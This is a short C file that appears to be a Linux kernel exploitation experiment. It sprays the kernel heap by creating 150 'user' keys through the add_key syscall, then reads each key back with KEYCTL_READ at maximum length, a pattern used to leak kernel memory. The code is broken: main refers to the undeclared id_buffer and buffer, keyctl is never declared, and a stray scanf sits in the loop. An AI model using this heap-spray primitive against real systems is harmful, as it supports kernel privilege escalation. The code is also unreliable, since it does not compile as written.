#define _GNU_SOURCE
#include <arpa/inet.h>
#include <limits.h>
#include <linux/netlink.h>
#include <linux/keyctl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <sys/syscall.h>
#include <unistd.h>

#define KEY_DESC_MAX_SIZE 40

typedef int32_t key_serial_t;

static inline key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid) {
    return syscall(__NR_add_key, type, description, payload, plen, ringid);
}

key_serial_t *spray_keyring(uint32_t spray_size) {
    int a;
    char key_desc[KEY_DESC_MAX_SIZE];
    key_serial_t *id_buffer = calloc(spray_size, sizeof(key_serial_t));

    if (id_buffer == NULL)
        puts("calloc");

    for (uint32_t i = 0; i < spray_size; i++) {
        snprintf(key_desc, KEY_DESC_MAX_SIZE, "Sechack-%03du", i);
        id_buffer[i] = add_key("user", key_desc, key_desc, strlen(key_desc), KEY_SPEC_PROCESS_KEYRING);
        scanf("%d", &a);
        printf("%d", id_buffer[i]);
        if (id_buffer[i] < 0)
            puts("add_key");
    }

    return id_buffer;
}

int main(void){
    key_serial_t *spray = spray_keyring(150);
    for(int i = 0; i < 150; i++)
        printf("%d\n", keyctl(KEYCTL_READ, id_buffer[i], (long)buffer, USHRT_MAX, 0));

    return 0;
}